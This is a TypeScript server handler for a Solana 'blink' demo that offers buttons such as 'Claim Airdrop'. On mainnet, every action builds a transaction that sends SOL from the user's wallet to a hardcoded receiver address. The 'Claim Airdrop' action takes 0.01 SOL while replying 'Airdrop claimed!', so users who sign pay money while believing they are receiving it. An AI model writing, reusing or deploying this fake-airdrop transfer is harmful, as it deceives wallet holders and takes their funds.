import { ActionGetResponse, ActionPostRequest, ActionPostResponse, ACTIONS_CORS_HEADERS} from "@solana/actions"
import { clusterApiUrl, Connection, PublicKey, SystemProgram, Transaction } from "@solana/web3.js"

export async function GET(request: Request) {
  const responseBody: ActionGetResponse = {
    icon: "http://localhost:3001/logoS.png",
    description: "This is solFHE demo blink",
    title: "Do Blink",
    label: "Try me!",
    //error: {
      //message: "This blink is not implemented yet!"
    //},
    links: {
      actions: [
        {
          href: request.url,
          label: "Same Action"
        },
        {
          href: request.url+"?action=another",
          label: "Another Action"
        },
        {
          href: request.url+"?action=nickname&param={nameParam}",
          label: "With Param",
          parameters:[
            {
              name: "nameParam",
              label: "nickname",
              required: true
            },
           /* {
              href: request.url+"?action=nickname&param={nameParam}&amount={amountParam}
              name: "amountParam",
              label: "amount",
              required: true
            }*/
          ]
        },
        {
          href: request.url+"?action=nickname&param={nameParam}",
          label: "Another With Param",
          parameters:[
            {
              name: "nameParam",
              label: "nickname",
              required: true
            }
          ]
        },
        {
          href: request.url + "?action=claim_airdrop",
          label: "Claim Airdrop"
        }
      ]
    },
    //disabled: true
  }

  const response = Response.json(responseBody, { headers: ACTIONS_CORS_HEADERS });
  return response;
}

export async function POST(request: Request) {
  const requestBody: ActionPostRequest = await request.json();
  const userPubkey = requestBody.account;
  console.log(userPubkey);

  const url = new URL(request.url);
  const action = url.searchParams.get('action');
  const param = url.searchParams.get('param');
  console.log("performing action: " + action);

  const user = new PublicKey(userPubkey);
  const connection = new Connection(clusterApiUrl("mainnet-beta"));

  let lamports = 1;  // Default transfer amount

  // Check if action is claim_airdrop
  if (action === "claim_airdrop") {
    lamports = 0.01 * 1e9;  // 0.01 SOL
  }

  const ix = SystemProgram.transfer({
    fromPubkey: user,
    toPubkey: new PublicKey('CBDjvUkZZ6ucrVGrU3vRraasTytha8oVg2NLCxAHE25b'),  // Receiver's wallet
    lamports
  });

  let name = userPubkey;
  const tx = new Transaction();
  
  if (action === "another") {
    tx.add(ix);
  } else if (action === "nickname") {
    name = param!;
    tx.add(ix);
  } else if (action === "claim_airdrop") {
    tx.add(ix);  // Airdrop transaction
  }

  tx.feePayer = user;
  tx.recentBlockhash = (await connection.getLatestBlockhash({ commitment: "finalized" })).blockhash;
  const serialTX = tx.serialize({ requireAllSignatures: false, verifySignatures: false }).toString("base64");

  const response: ActionPostResponse = {
    transaction: serialTX,
    message: action === "claim_airdrop" ? "Airdrop claimed!" : "Hello " + name
  };

  return Response.json(response, { headers: ACTIONS_CORS_HEADERS });
}

export async function OPTIONS(request: Request) {
  return new Response(null, { headers: ACTIONS_CORS_HEADERS });
}